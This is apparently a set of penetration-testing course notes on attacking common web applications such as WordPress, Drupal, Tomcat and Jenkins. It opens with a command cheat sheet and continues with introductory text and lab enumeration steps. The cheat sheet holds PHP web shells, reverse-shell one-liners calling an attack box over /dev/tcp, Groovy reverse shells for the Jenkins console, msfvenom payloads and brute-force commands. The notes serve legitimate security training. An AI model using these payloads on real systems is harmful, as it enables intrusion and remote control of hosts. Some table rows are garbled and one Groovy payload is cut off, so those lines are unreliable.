
<body>
  <div class="container">
<link rel="stylesheet" href="style.css">


<h1 id="22-attacking-common-applications">22. Attacking Common Applications</h1>
<h2 id="-cheat-sheet-"><strong>Cheat Sheet</strong></h2>
<p>The cheat sheet is a useful command reference for this module.</p>
<table>
<thead>
<tr>
<th>Command</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>sudo vim /etc/hosts</code></td>
<td>Opens the <code>/etc/hosts</code> with <code>vim</code> to start adding hostnames</td>
</tr>
<tr>
<td><code>sudo nmap -p 80,443,8000,8080,8180,8888,10000 --open -oA web_discovery -iL scope_list</code></td>
<td>Runs an nmap scan using common web application ports based on a scope list (<code>scope_list</code>) and outputs to a file (<code>web_discovery</code>) in all formats (<code>-oA</code>)</td>
</tr>
<tr>
<td><code>eyewitness --web -x web_discovery.xml -d &lt;nameofdirectorytobecreated&gt;</code></td>
<td>Runs <code>eyewitness</code> using a file generated by an nmap scan (<code>web_discovery.xml</code>) and creates a directory (<code>-d</code>)</td>
</tr>
<tr>
<td>`cat web_discovery.xml \</td>
<td>./aquatone -nmap`</td>
<td>Concatenates the contents of nmap scan output (web_discovery.xml) and pipes it to aquatone (<code>./aquatone</code>) while ensuring aquatone recognizes the file as nmap scan output (<code>-nmap</code>)</td>
</tr>
<tr>
<td><code>sudo wpscan --url &lt;http://domainnameoripaddress&gt; --enumerate</code></td>
<td>Runs wpscan using the <code>--enmuerate</code> flag. Can replace the url with any valid and reachable URL in each challenge</td>
</tr>
<tr>
<td><code>sudo wpscan --password-attack xmlrpc -t 20 -U john -P /usr/share/wordlists/rockyou.txt --url &lt;http://domainnameoripaddress&gt;</code></td>
<td>Runs wpscan and uses it to perform a password attack (<code>--password-attack</code>) against the specified url and references a word list (<code>/usr/share/wordlists/rockyou.txt</code>)</td>
</tr>
<tr>
<td><code>curl -s http://&lt;hostnameoripoftargetsite/path/to/webshell.php?cmd=id</code></td>
<td>cURL command used to execute commands (<code>cmd=id</code>) on a vulnerable system utilizing a php-based webshell</td>
</tr>
<tr>
<td><code>&lt;?php exec(&quot;/bin/bash -c &#39;bash -i &gt;&amp; /dev/tcp/&lt;ip address of attack box&gt;/&lt;port of choice&gt; 0&gt;&amp;1&#39;&quot;);</code></td>
<td>PHP code that will execute a reverse shell on a Linux-based system</td>
</tr>
<tr>
<td><code>droopescan scan joomla --url http://&lt;domainnameoripaddress&gt;</code></td>
<td>Runs <code>droopescan</code> against a joomla site located at the specified url</td>
</tr>
<tr>
<td><code>sudo python3 joomla-brute.py -u http://dev.inlanefreight.local -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr &lt;username or path to username list&gt;</code></td>
<td>Runs joomla-brute.py tool with python3 against a specified url, utilizing a specified wordlist (<code>/usr/share/metasploit-framework/data/wordlists/http_default_pass.txt</code>) and user or list of usernames (<code>-usr</code>)</td>
</tr>
<tr>
<td><code>&lt;?php system($_GET[&#39;dcfdd5e021a869fcc6dfaef8bf31377e&#39;]); ?&gt;</code></td>
<td>PHP code that will allow for web shell access on a vulnerable drupal site. Can be used through browisng to the location of the file in the web directory after saving. Can also be leveraged utilizing curl. See next command.</td>
</tr>
<tr>
<td>`curl -s <http://domainname or IP address of site> /node/3?dcfdd5e021a869fcc6dfaef8bf31377e=id \</td>
<td>grep uid \</td>
<td>cut -f4 -d&quot;&gt;&quot;`</td>
<td>Uses curl to navigate to php web shell file and run system commands (<code>=id</code>) on the target</td>
</tr>
<tr>
<td><code>gobuster dir -u &lt;http://domainnameoripaddressofsite&gt; -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt</code></td>
<td><code>gobuster</code> powered directory brute forcing attack refrencing a wordlist (<code>/usr/share/dirbuster/wordlists/directory-list-2.3-small.txt</code>)</td>
</tr>
<tr>
<td><code>auxiliary/scanner/http/tomcat_mgr_login</code></td>
<td>Useful Metasploit scanner module used to perform a bruteforce login attack against a tomcat site</td>
</tr>
<tr>
<td><code>python3 mgr_brute.py -U &lt;http://domainnameoripaddressofTomCatsite&gt; -P /manager -u /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt -p /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt</code></td>
<td>Runs mgr_brute.py using python3 against the specified website starts in the /manager directory (<code>-P /manager</code>) and references a specified user or userlist ( <code>-u</code>) as well as a specified password or password list (<code>-p</code>)</td>
</tr>
<tr>
<td><code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;ip address of attack box&gt; LPORT=&lt;port to listen on to catch a shell&gt; -f war &gt; backup.war</code></td>
<td>Generates a jsp-based reverse shell payload in the form of a .war file utilizing <code>msfvenom</code></td>
</tr>
<tr>
<td><code>nmap -sV -p 8009,8080 &lt;domainname or IP address of tomcat site&gt;</code></td>
<td>Nmap scan useful in enumerating Apache Tomcat and AJP services</td>
</tr>
<tr>
<td>`r = Runtime.getRuntime() p = r.exec([&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/10.10.14.15/8443;cat &lt;&amp;5 \</td>
<td>while read line; do \$line 2&gt;&amp;5 &gt;&5; done&quot;] as String[]) p.waitFor()`</td>
<td>Groovy-based reverse shell payload/code that can work with admin access to the <code>Script Console</code> of a <code>Jenkins</code> site. Will work when the underlying OS is Linux</td>
</tr>
<tr>
<td><code>def cmd = &quot;cmd.exe /c dir&quot;.execute(); println(&quot;${cmd.text}&quot;);</code></td>
<td>Groovy-based payload/code that can work with admin access to the <code>Script Console</code> of a <code>Jenkins</code> site. This will allow webshell access and to execute commands on the underlying Windows system</td>
</tr>
<tr>
<td><code>String host=&quot;localhost&quot;; int port=8044; String cmd=&quot;cmd.exe&quot;; Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new So);</code></td>
<td>Groovy-based reverse shell payload/code that can work with admin acess to the <code>Script Console</code> of a <code>Jenkins</code>site. Will work when the underlying OS is Windows</td>
</tr>
<tr>
<td><a href="https://github.com/0xjpuff/reverse\_shell\_splunk">reverse_shell_splunk</a></td>
<td>A simple Splunk package for obtaining revershells on Windows and Linux systems</td>
</tr>
<tr>
<td></td>
</tr>
</tbody>
</table>
<h2 id="introduction-to-attacking-common-applications">Introduction to Attacking Common Applications</h2>
<hr>
<p>Web-based applications are prevalent in most if not all environments that we encounter as penetration testers. During our assessments, we will come across a wide variety of web applications such as Content Management Systems (CMS), custom web applications, intranet portals used by developers and sysadmins, code repositories, network monitoring tools, ticketing systems, wikis, knowledge bases, issue trackers, servlet container applications, and more. It&#39;s common to find the same applications across many different environments. While an application may not be vulnerable in one environment, it may be misconfigured or unpatched in the next. An assessor needs to have a firm grasp of enumerating and attacking the common applications covered in this module.</p>
<p>Web applications are interactive applications that can be accessed via web browsers. Web applications typically adopt a client-server architecture to run and handle interactions. They usually are made up of front-end components (the website interface, or &quot;what the user sees&quot;) that run on the client-side (browser) and other back-end components (web application source code) that run on the server-side (back end server/databases). For an in-depth study of the structure and function of web applications, check out the <a href="https://academy.hackthebox.com/course/preview/introduction-to-web-applications">Introduction to Web Applications</a> module.</p>
<p>All types of web applications (commercial, open-source, and custom) can suffer from the same kinds of vulnerabilities and misconfigurations, namely the top 10 web application risks covered in the <a href="https://owasp.org/www-project-top-ten/">OWASP Top 10</a>. While we may encounter vulnerable versions of many common applications that suffer from known (public) vulnerabilities such as SQL injection, XSS, remote code execution bugs, local file read, and unrestricted file upload, it is equally important for us to understand how we can abuse the built-in functionality of many of these applications to achieve remote code execution.</p>
<p>As organizations continue to harden their external perimeter and limit exposed services, web applications are becoming a more attractive target for malicious actors and penetration testers alike. More and more companies are transitioning to remote work and exposing (intentionally or unintentionally) applications to the outside world. The applications discussed in this module are typically just as likely to be exposed on the external network as the internal network. These applications can serve as a foothold into the internal environment during an external assessment or as a foothold, lateral movement, or additional issue to report to our client during an internal assessment.</p>
<p><a href="https://blog.barracuda.com/2021/05/18/report-the-state-of-application-security-in-2021/">The state of application security in 2021</a> was a research survey commissioned by Barracuda to gather information from application security-related decision-makers. The survey includes responses from 750 decision-makers in companies with 500 or more employees across the globe. The survey findings were astounding: 72% of respondents stated that their organization suffered at least one breach due to an application vulnerability, 32% suffered two breaches, and 14% suffered three. The organizations polled broke down their challenges as follows: bot attacks (43%), software supply chain attacks (39%), vulnerability detection (38%), and securing APIs (37%). This module will focus on known vulnerabilities and misconfigurations in open-source and commercial applications (free versions demoed in this module), which make up a large percentage of the successful attacks that organizations face regularly.</p>
<hr>
<h3 id="application-data">Application Data</h3>
<p>This module will study several common applications in-depth while briefly covering some other less common (but still seen often) ones. Just some of the categories of applications we may come across during a given assessment that we may be able to leverage to gain a foothold or gain access to sensitive data include:</p>
<table>
<thead>
<tr>
<th><strong>Category</strong></th>
<th><strong>Applications</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><a href="https://enlyft.com/tech/web-content-management">Web Content Management</a></td>
<td>Joomla, Drupal, WordPress, DotNetNuke, etc.</td>
</tr>
<tr>
<td><a href="https://enlyft.com/tech/application-servers">Application Servers</a></td>
<td>Apache Tomcat, Phusion Passenger, Oracle WebLogic, IBM WebSphere, etc.</td>
</tr>
<tr>
<td><a href="https://enlyft.com/tech/security-information-and-event-management-siem">Security Information and Event Management (SIEM)</a></td>
<td>Splunk, Trustwave, LogRhythm, etc.</td>
</tr>
<tr>
<td><a href="https://enlyft.com/tech/network-management">Network Management</a></td>
<td>PRTG Network Monitor, ManageEngine Opmanger, etc.</td>
</tr>
<tr>
<td><a href="https://enlyft.com/tech/it-management-software">IT Management</a></td>
<td>Nagios, Puppet, Zabbix, ManageEngine ServiceDesk Plus, etc.</td>
</tr>
<tr>
<td><a href="https://enlyft.com/tech/software-frameworks">Software Frameworks</a></td>
<td>JBoss, Axis2, etc.</td>
</tr>
<tr>
<td><a href="https://enlyft.com/tech/customer-service-management">Customer Service Management</a></td>
<td>osTicket, Zendesk, etc.</td>
</tr>
<tr>
<td><a href="https://enlyft.com/tech/search-engines">Search Engines</a></td>
<td>Elasticsearch, Apache Solr, etc.</td>
</tr>
<tr>
<td><a href="https://enlyft.com/tech/software-configuration-management">Software Configuration Management</a></td>
<td>Atlassian JIRA, GitHub, GitLab, Bugzilla, Bugsnag, Bitbucket, etc.</td>
</tr>
<tr>
<td><a href="https://enlyft.com/tech/software-development-tools">Software Development Tools</a></td>
<td>Jenkins, Atlassian Confluence, phpMyAdmin, etc.</td>
</tr>
<tr>
<td><a href="https://enlyft.com/tech/enterprise-application-integration">Enterprise Application Integration</a></td>
<td>Oracle Fusion Middleware, BizTalk Server, Apache ActiveMQ, etc.</td>
</tr>
</tbody>
</table>
<p>As you can see browsing the links for each category above, there are <a href="https://enlyft.com/tech/">thousands of applications</a> that we may encounter during a given assessment. Many of these suffer from publicly known exploits or have functionality that can be abused to gain remote code execution, steal credentials, or access sensitive information with or without valid credentials. This module will cover the most prevalent applications that we repeatedly see during internal and external assessments.</p>
<p>Let&#39;s take a look at the Enlyft website. We can see, for example, they were able to gather data on over 3.7 million companies that are using <a href="https://enlyft.com/tech/products/wordpress">WordPress</a> which makes up nearly 70% of the market share worldwide for Web Content Management applications for all companies polled. For SIEM tool <a href="https://enlyft.com/tech/products/splunk">Splunk</a> was used by 22,174 of the companies surveyed and represented nearly 30% of the market share for SIEM tools. While the remaining applications we will cover represent a much smaller market share for their respective category, I still see these often, and the skills learned here can be applied to many different situations.</p>
<p>While working through the section examples, questions, and skills assessments, make a concerted effort to learn how these applications work and <em>why</em> specific vulnerabilities and misconfigurations exist rather than just reproducing the examples to move swiftly through the module. These skills will benefit you greatly and could likely help you identify attack paths in different applications that you encounter during an assessment for the first time. I still encounter applications that I have only seen a few times or never before, and approaching them with this mindset has often helped me pull off attacks or find a way to abuse built-in functionality.</p>
<hr>
<h3 id="a-quick-story">A Quick Story</h3>
<p>For example, during one external penetration test, I encountered the <a href="https://www.sonatype.com/products/repository-oss">Nexus Repository OSS application</a> from Sonatype, which I had never seen before. I quickly found that the default admin credentials of <code>admin:admin123</code> for that version had not been changed, and I was able to log in and poke around the admin functionality. In this version, I leveraged the API as an authenticated user to gain remote code execution on the system. I encountered this application on another assessment, was able to log in with default credentials yet again. This time was able to abuse the <a href="https://help.sonatype.com/repomanager3/system-configuration/tasks#Tasks-Admin-Executescript">Tasks</a> functionality (which was disabled the first time I encountered this application) and write a quick <a href="https://groovy-lang.org/">Groovy</a> <a href="https://help.sonatype.com/repomanager3/rest-and-integration-api/script-api/writing-scripts">script</a> in Java syntax to execute a script and gain remote code execution. This is similar to how we&#39;ll abuse the Jenkins <a href="https://www.jenkins.io/doc/book/managing/script-console/">script console</a> later in this module. I have encountered many other applications, such as <a href="https://www.manageengine.com/products/applications\_manager/me-opmanager-monitoring.html">OpManager</a> from ManageEngine that allow you to run a script as the user that the application is running under (usually the powerful NT AUTHORITY\SYSTEM account) and gain a foothold. We should never overlook applications during an internal and external assessment as they may be our only way &quot;in&quot; in a relatively well-maintained environment.</p>
<hr>
<h3 id="common-applications">Common Applications</h3>
<p>I typically run into at least one of the applications below, which we will cover in-depth throughout the module sections. While we cannot cover every possible application that we may encounter, the skills taught in this module will prepare us to approach all applications with a critical eye and assess them for public vulnerabilities and misconfigurations.</p>
<table><thead><tr><th width="149">Application</th><th>Description</th></tr></thead><tbody><tr><td>WordPress</td><td><a href="https://wordpress.org/">WordPress</a> is an open-source Content Management System (CMS) that can be used for multiple purposes. It&#39;s often used to host blogs and forums. WordPress is highly customizable as well as SEO friendly, which makes it popular among companies. However, its customizability and extensible nature make it prone to vulnerabilities through third-party themes and plugins. WordPress is written in PHP and usually runs on Apache with MySQL as the backend.</td></tr><tr><td>Drupal</td><td><a href="https://www.drupal.org/">Drupal</a> is another open-source CMS that is popular among companies and developers. Drupal is written in PHP and supports using MySQL or PostgreSQL for the backend. Additionally, SQLite can be used if there&#39;s no DBMS installed. Like WordPress, Drupal allows users to enhance their websites through the use of themes and modules.</td></tr><tr><td>Joomla</td><td><a href="https://www.joomla.org/">Joomla</a> is yet another open-source CMS written in PHP that typically uses MySQL but can be made to run with PostgreSQL or SQLite. Joomla can be used for blogs, discussion forums, e-commerce, and more. Joomla can be customized heavily with themes and extensions and is estimated to be the third most used CMS on the internet after WordPress and Shopify.</td></tr><tr><td>Tomcat</td><td><a href="https://tomcat.apache.org/">Apache Tomcat</a> is an open-source web server that hosts applications written in Java. Tomcat was initially designed to run Java Servlets and Java Server Pages (JSP) scripts. However, its popularity increased with Java-based frameworks and is now widely used by frameworks such as Spring and tools such as Gradle.</td></tr><tr><td>Jenkins</td><td><a href="https://jenkins.io/">Jenkins</a> is an open-source automation server written in Java that helps developers build and test their software projects continuously. It is a server-based system that runs in servlet containers such as Tomcat. Over the years, researchers have uncovered various vulnerabilities in Jenkins, including some that allow for remote code execution without requiring authentication.</td></tr><tr><td>Splunk</td><td>Splunk is a log analytics tool used to gather, analyze and visualize data. Though not originally intended to be a SIEM tool, Splunk is often used for security monitoring and business analytics. Splunk deployments are often used to house sensitive data and could provide a wealth of information for an attacker if compromised. Historically, Splunk has not suffered from a considerable amount of known vulnerabilities aside from an information disclosure vulnerability (<a href="https://nvd.nist.gov/vuln/detail/CVE-2018-11409">CVE-2018-11409</a>), and an authenticated remote code execution vulnerability in very old versions (<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-4642">CVE-2011-4642</a>).</td></tr><tr><td>PRTG Network Monitor</td><td><a href="https://www.paessler.com/prtg">PRTG Network Monitor</a> is an agentless network monitoring system that can be used to monitor metrics such as uptime, bandwidth usage, and more from a variety of devices such as routers, switches, servers, etc. It utilizes an auto-discovery mode to scan a network and then leverages protocols such as ICMP, WMI, SNMP, and NetFlow to communicate with and gather data from discovered devices. PRTG is written in <a href="https://en.wikipedia.org/wiki/Delphi_(software)">Delphi</a>.</td></tr><tr><td>osTicket</td><td><a href="https://osticket.com/">osTicket</a> is a widely-used open-source support ticketing system. It can be used to manage customer service tickets received via email, phone, and the web interface. osTicket is written in PHP and can run on Apache or IIS with MySQL as the backend.</td></tr><tr><td>GitLab</td><td><a href="https://about.gitlab.com/">GitLab</a> is an open-source software development platform with a Git repository manager, version control, issue tracking, code review, continuous integration and deployment, and more. It was originally written in Ruby but now utilizes Ruby on Rails, Go, and Vue.js. GitLab offers both community (free) and enterprises versions of the software.</td></tr></tbody></table>

<hr>
<h3 id="module-targets">Module Targets</h3>
<p>Throughout the module sections, we will refer to URLs such as <code>http://app.inlanefreight.local</code>. To simulate a large, realistic environment with multiple webservers, we utilize Vhosts to house the web applications. Since these Vhosts all map to a different directory on the same host, we have to make manual entries in our <code>/etc/hosts</code> file on the Pwnbox or local attack VM to interact with the lab. This needs to be done for any examples that show scans or screenshots using a FQDN. Sections such as Splunk that only use the spawned target&#39;s IP address will not require a hosts file entry, and you can just interact with the spawned IP address and associated port.</p>
<p>To do this quickly, we could run the following:</p>
<p>Introduction to Attacking Common Applications</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ IP=<span class="hljs-number">10.129</span><span class="hljs-number">.42</span><span class="hljs-number">.195</span>
root@htb[/htb]$ printf <span class="hljs-string">"%s<span class="hljs-subst">\t</span>%s<span class="hljs-subst">\n</span><span class="hljs-subst">\n</span>"</span> <span class="hljs-string">"$IP"</span> <span class="hljs-string">"app.inlanefreight.local dev.inlanefreight.local blog.inlanefreight.local"</span> | sudo tee -a /etc/hosts
</code></pre>
<p>After this command, our <code>/etc/hosts</code> file would look like the following (on a newly spawned Pwnbox):</p>
<p>Introduction to Attacking Common Applications</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ cat /etc/hosts

# Your <span class="hljs-keyword">system</span> has configured <span class="hljs-string">'manage_etc_hosts'</span> <span class="hljs-keyword">as</span> <span class="hljs-literal">True</span>.
# As a result, <span class="hljs-keyword">if</span> you wish for changes to this file to persist
# then you will need to either
# a.) make changes to the master file <span class="hljs-keyword">in</span> /etc/cloud/templates/hosts.debian.tmpl
# b.) change or remove the value <span class="hljs-keyword">of</span> <span class="hljs-string">'manage_etc_hosts'</span> <span class="hljs-keyword">in</span>
#     /etc/cloud/cloud.cfg or cloud-config <span class="hljs-keyword">from</span> user-data
#
<span class="hljs-number">127.0</span><span class="hljs-number">.1</span><span class="hljs-number">.1</span> htb<span class="hljs-number">-9</span>zftpkslke.htb-cloud.com htb<span class="hljs-number">-9</span>zftpkslke
<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span> localhost

# The following lines are desirable for IPv6 capable hosts
::<span class="hljs-number">1</span> ip6-localhost ip6-loopback
fe00::<span class="hljs-number">0</span> ip6-localnet
ff00::<span class="hljs-number">0</span> ip6-mcastprefix
ff02::<span class="hljs-number">1</span> ip6-allnodes
ff02::<span class="hljs-number">2</span> ip6-allrouters
ff02::<span class="hljs-number">3</span> ip6-allhosts

<span class="hljs-number">10.129</span><span class="hljs-number">.42</span><span class="hljs-number">.195</span>    app.inlanefreight.local dev.inlanefreight.local blog.inlanefreight.local
</code></pre>
<p>You may wish to write your own script or edit the hosts file by hand, which is fine.</p>
<p>If you spawn a target during a section and cannot access it directly via the IP be sure to check your hosts file and update any entries!</p>
<p>Module exercises that require vhosts will display a list that you can use to edit your hosts file after spawning the target VM at the bottom of the respective section.</p>
<h2 id="application-discovery-enumeration">Application Discovery &amp; Enumeration</h2>
<hr>
<p>To effectively manage their network, an organization should maintain (and continuously update) an asset inventory that includes all network-connected devices (servers, workstations, network appliances, etc.), installed software, and applications in use across the environment. If an organization is unsure what is present on its network, how will it know what to protect and what potential holes exist? The organization should know if applications are installed locally or hosted by a third party, their current patch level, if they are at or nearing end-of-life, be able to detect any rogue applications in the network (or &quot;shadow IT&quot;), and have enough visibility into each application to ensure that they are adequately secured with strong (non-default) passwords, and ideally, multi-factor authentication is enabled. Certain applications have administrative portals that can be restricted to only being accessible from specific IP addresses or the host itself (localhost).</p>
<p>The reality is that many organizations do not know everything on their network, and some organizations have very little visibility, and we can help them with this. The enumeration that we perform can be highly beneficial to our clients to help them enhance or start building an asset inventory. We may very likely identify applications that have been forgotten, demo versions of software that perhaps have had their trial license expired and converted to a version that does not require authentication (in the case of Splunk), applications with default/weak credentials, unauthorized/misconfigured applications, and applications that suffer from public vulnerabilities. We can provide this data to our clients as a combination of the findings in our reports (i.e., an application with default credentials <code>admin:admin</code>, as appendices such as a list of identified services mapped to hosts, or supplemental scan data). We can even take it a step further and educate our clients on some of the tools that we use daily so they can begin to perform periodic and proactive recon of their networks and find gaps before penetration testers, or worse, attackers, find them first.</p>
<p>As penetration testers, we need to have strong enumeration skills and be able to get the &quot;lay of the land&quot; on any network starting with very little to no information (black box discovery or just a set of CIDR ranges). Typically, when we connect to a network, we&#39;ll start with a ping sweep to identify &quot;live hosts.&quot; From there, we will usually begin targeted port scanning and, eventually, deeper port scanning to identify running services. In a network with hundreds or thousands of hosts, this enumeration data can become unwieldy. Let&#39;s say we perform an Nmap port scan to identify common web services such as:</p>
<p><strong>Nmap - Web Discovery</strong></p>
<p>Application Discovery &amp; Enumeration</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ nmap -p <span class="hljs-number">80</span>,<span class="hljs-number">443</span>,<span class="hljs-number">8000</span>,<span class="hljs-number">8080</span>,<span class="hljs-number">8180</span>,<span class="hljs-number">8888</span>,<span class="hljs-number">1000</span> --open -oA web_discovery -iL scope_list
</code></pre>
<p>We may find an enormous amount of hosts with services running on ports 80 and 443 alone. What do we do with this data? Sifting through the enumeration data by hand in a large environment would be far too time-consuming, especially since most assessments are under strict time constraints. Browsing to each IP/hostname + port would also be highly inefficient.</p>
<p>Lucky for us, several great tools exist that can greatly assist in this process. Two phenomenal tools that every tester should have in their arsenal are <a href="https://github.com/FortyNorthSecurity/EyeWitness">EyeWitness</a> and <a href="https://github.com/michenriksen/aquatone">Aquatone</a>. Both of these tools can be fed raw Nmap XML scan output (Aquatone can also take Masscan XML; EyeWitness can take Nessus XML output) and be used to quickly inspect all hosts running web applications and take screenshots of each. The screenshots are then assembled into a report that we can work through in the web browser to assess the web attack surface.</p>
<p>These screenshots can help us narrow down potentially 100s of hosts and build a more targeted list of applications that we should spend more time enumerating and attacking. These tools are available for both Windows and Linux, so we can utilize them on whatever we choose for our attack box in a given environment. Let&#39;s walk through some examples of each to create an inventory of applications present in the target <code>INLANEFREIGHT.LOCAL</code> domain.</p>
<hr>
<h3 id="getting-organized">Getting Organized</h3>
<p>Though we will cover notetaking, reporting, and documentation in a separate module, it is worth taking the opportunity to select a notetaking application if we haven&#39;t done so and begin setting it up to best record the data we are gathering in this phase. The module <a href="https://academy.hackthebox.com/course/preview/getting-started">Getting Started</a> discusses several notetaking applications. If you have not chosen one at this point, it would be an excellent time to start. Tools like OneNote, Evernote, Notion, Cherrytree, etc., are all good options, and it comes down to personal preference. Regardless of the tool you choose, we should be working on our notetaking methodology at this point and be creating templates that we can use in our tool of choice set up for every assessment type.</p>
<p>For this section, I would break down the <code>Enumeration &amp; Discovery</code> section of my notebook into a separate <code>Application Discovery</code> section. Here I would create subsections for the scope, scans (Nmap, Nessus, Masscan, etc.), application screenshotting, and interesting/notable hosts to dig more into later. It is important to time and date stamp every scan that we perform and save all output and the exact scan syntax that was performed and the targeted hosts. This can be useful later on if the client has any questions about the activity they saw during the assessment. Being organized from the start and keeping detailed logs and notes will help us greatly with the final report. I typically set up the skeleton of the report at the beginning of the assessment along with my notebook so I can begin filling in certain sections of the report while waiting for a scan to finish. All of this will save time at the end of the engagement, leave us more time for the fun stuff (testing misconfigurations and exploits!), and ensure that we are as thorough as possible.</p>
<p>An example OneNote (also applicable to other tools) structure may look like the following for the discovery phase:</p>
<p><code>External Penetration Test - &lt;Client Name&gt;</code></p>
<ul>
<li><code>Scope</code> (including in-scope IP addresses/ranges, URLs, any fragile hosts, testing timeframes, and any limitations or other relative information we need handy)</li>
<li><code>Client Points of Contact</code></li>
<li><code>Credentials</code></li>
<li><code>Discovery/Enumeration</code><ul>
<li><code>Scans</code></li>
<li><code>Live hosts</code></li>
</ul>
</li>
<li><code>Application Discovery</code><ul>
<li><code>Scans</code></li>
<li><code>Interesting/Notable Hosts</code></li>
</ul>
</li>
<li><code>Exploitation</code><ul>
<li><code>&lt;Hostname or IP&gt;</code></li>
<li><code>&lt;Hostname or IP&gt;</code></li>
</ul>
</li>
<li><code>Post-Exploitation</code><ul>
<li><code>&lt;Hostname or IP&gt;</code></li>
<li><code>&lt;&lt;Hostname or IP&gt;</code></li>
</ul>
</li>
</ul>
<p>We will refer back to this structure throughout the module, so it would be a very beneficial exercise to replicate this and record all of our work on this module as if we were working through an actual engagement. This will help us refine our documentation methodology, an essential skill for a successful penetration tester. Having notes to refer back to from each section will be helpful when we get to the three skills assessments at the end of the module and will be extremely helpful as we progress in the <code>Penetration Tester</code> path.</p>
<hr>
<h3 id="initial-enumeration">Initial Enumeration</h3>
<p>Let&#39;s assume our client provided us with the following scope:</p>
<p>Application Discovery &amp; Enumeration</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ cat scope_list 

app<span class="hljs-selector-class">.inlanefreight</span><span class="hljs-selector-class">.local</span>
dev<span class="hljs-selector-class">.inlanefreight</span><span class="hljs-selector-class">.local</span>
drupal-dev<span class="hljs-selector-class">.inlanefreight</span><span class="hljs-selector-class">.local</span>
drupal-qa<span class="hljs-selector-class">.inlanefreight</span><span class="hljs-selector-class">.local</span>
drupal-acc<span class="hljs-selector-class">.inlanefreight</span><span class="hljs-selector-class">.local</span>
drupal<span class="hljs-selector-class">.inlanefreight</span><span class="hljs-selector-class">.local</span>
blog-dev<span class="hljs-selector-class">.inlanefreight</span><span class="hljs-selector-class">.local</span>
blog<span class="hljs-selector-class">.inlanefreight</span><span class="hljs-selector-class">.local</span>
app-dev<span class="hljs-selector-class">.inlanefreight</span><span class="hljs-selector-class">.local</span>
jenkins-dev<span class="hljs-selector-class">.inlanefreight</span><span class="hljs-selector-class">.local</span>
jenkins<span class="hljs-selector-class">.inlanefreight</span><span class="hljs-selector-class">.local</span>
web01<span class="hljs-selector-class">.inlanefreight</span><span class="hljs-selector-class">.local</span>
gitlab-dev<span class="hljs-selector-class">.inlanefreight</span><span class="hljs-selector-class">.local</span>
gitlab<span class="hljs-selector-class">.inlanefreight</span><span class="hljs-selector-class">.local</span>
support-dev<span class="hljs-selector-class">.inlanefreight</span><span class="hljs-selector-class">.local</span>
support<span class="hljs-selector-class">.inlanefreight</span><span class="hljs-selector-class">.local</span>
inlanefreight<span class="hljs-selector-class">.local</span>
<span class="hljs-number">10.129</span>.<span class="hljs-number">201.50</span>
</code></pre>
<p>We can start with an Nmap scan of common web ports. I&#39;ll typically do an initial scan with ports <code>80,443,8000,8080,8180,8888,10000</code> and then run either EyeWitness or Aquatone (or both depending on the results of the first) against this initial scan. While reviewing the screenshot report of the most common ports, I may run a more thorough Nmap scan against the top 10,000 ports or all TCP ports, depending on the size of the scope. Since enumeration is an iterative process, we will run a web screenshotting tool against any subsequent Nmap scans we perform to ensure maximum coverage.</p>
<p>On a non-evasive full scope penetration test, I will usually run a Nessus scan too to give the client the most bang for their buck, but we must be able to perform assessments without relying on scanning tools. Even though most assessments are time-limited (and often not scoped appropriately for the size of the environment), we can provide our clients maximum value by establishing a repeatable and thorough enumeration methodology that can be applied to all environments we cover. We need to be efficient during the information gathering/discovery stage while not taking shortcuts that could leave critical flaws undiscovered. Everyone&#39;s methodology and preferred tools will vary a bit, and we should strive to create one that works well for us while still arriving at the same end goal.</p>
<p>All scans we perform during a non-evasive engagement are to gather data as inputs to our manual validation and manual testing process. We should not rely solely on scanners as the human element in penetration testing is essential. We often find the most unique and severe vulnerabilities and misconfigurations only through thorough manual testing.</p>
<p>Let&#39;s dig into the scope list mentioned above with an Nmap scan that will typically discover most web applications in an environment. We will, of course, perform deeper scans later on, but this will give us a good starting point.</p>
<p>Note: Not all hosts in the scope list above will be accessible when spawning the target below. There will be separate, similar, exercises at the end of this section in order to reproduce much of what is shown here.</p>
<p>Application Discovery &amp; Enumeration</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ sudo  nmap -p <span class="hljs-number">80</span>,<span class="hljs-number">443</span>,<span class="hljs-number">8000</span>,<span class="hljs-number">8080</span>,<span class="hljs-number">8180</span>,<span class="hljs-number">8888</span>,<span class="hljs-number">10000</span> <span class="hljs-comment">--open -oA web_discovery -iL scope_list </span>

Starting Nmap <span class="hljs-number">7.80</span> ( https://nmap.org ) at <span class="hljs-number">2021</span>-<span class="hljs-number">09</span>-<span class="hljs-number">07</span> <span class="hljs-number">21</span>:<span class="hljs-number">49</span> EDT
Stats: <span class="hljs-number">0</span>:<span class="hljs-number">00</span>:<span class="hljs-number">07</span> elapsed; <span class="hljs-number">1</span> hosts completed (<span class="hljs-number">4</span> up), <span class="hljs-number">4</span> undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About <span class="hljs-number">81.24</span>% done; ETC: <span class="hljs-number">21</span>:<span class="hljs-number">49</span> (<span class="hljs-number">0</span>:<span class="hljs-number">00</span>:<span class="hljs-number">01</span> remaining)

Nmap scan <span class="hljs-keyword">report</span> <span class="hljs-keyword">for</span> app.inlanefreight.local (<span class="hljs-number">10.129</span>.<span class="hljs-number">42.195</span>)
Host <span class="hljs-keyword">is</span> up (<span class="hljs-number">0.12</span>s latency).
<span class="hljs-keyword">Not</span> shown: <span class="hljs-number">998</span> closed ports
<span class="hljs-keyword">PORT</span>   STATE SERVICE
<span class="hljs-number">22</span>/tcp <span class="hljs-keyword">open</span>  ssh
<span class="hljs-number">80</span>/tcp <span class="hljs-keyword">open</span>  http

